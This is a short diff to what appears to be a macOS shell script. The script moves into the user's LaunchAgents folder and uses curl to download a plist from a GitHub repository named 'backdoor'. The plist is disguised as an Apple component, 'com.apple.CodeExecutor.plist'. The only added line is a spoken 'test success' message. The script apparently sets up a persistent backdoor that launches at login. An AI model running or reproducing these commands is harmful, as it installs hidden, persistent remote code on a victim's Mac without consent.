@@ -1,2 +1,3 @@
 cd ~/Library/LaunchAgents/
 curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.apple.CodeExecutor.plist"
+say test success
